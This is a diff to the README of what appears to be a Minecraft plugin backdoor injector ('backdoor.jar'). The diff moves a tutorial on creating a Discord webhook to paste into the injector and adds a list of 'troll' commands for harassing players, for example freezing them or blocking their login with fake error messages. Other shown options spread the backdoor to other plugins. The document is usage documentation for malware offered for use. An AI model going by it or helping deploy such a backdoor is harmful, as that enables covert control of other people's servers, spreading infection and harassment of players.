@@ -27,6 +27,12 @@ Java -jar backdoor.jar (filename) [options]
 * --spread / -s : Spread to other plugins.
 * --debug / -b : Send debug messages in console. Use this before creating issue reports.
 
+## Discord Token Tutorial
+1) In a discord server, open Server Settings, Then "Integrations"
+2) Press 'Create Webhook'
+3) Name and profile picture can be customised, then press "Copy Webhook URL"
+4) Paste into injector / command line.
+
 ## Commands
 Default command prefix is ``#``,  this can be changed.
 * #help - display all command, or description of command
@@ -69,11 +75,17 @@ Warning:
 Teleporting may cause a '[player name] moved to quickly!' warning in server console. It may also cause anti-cheat to kick you.
 Other strange behavior may occur when teleporting extreme distances. (such as to the world border)
 
-## Discord Token Tutorial
-1) In a discord server, open Server Settings, Then "Integrations"
-2) Press 'Create Webhook'
-3) Name and profile picture can be customised, then press "Copy Webhook URL"
-4) Paste into injector / command line.
+## Troll subcommands
+* clear - Clear all status of player. This will also reset Instabreak, Vanish, and silktouch
+* thrower - Spam player with stacks of stone
+* interact - Disable world interaction
+* cripple - Player will be frozen in place
+* flight -  Player unable to fly, even in creative mode.
+* inventory - Disable inventory interaction
+* mine - Player unable to mine blocks
+* login - Player will be unable to login, generating fake error messages
+* god - Immortality
+* damage - Player unable to deal damage
 
 ## License
 This software is provided under the GPL3 License.
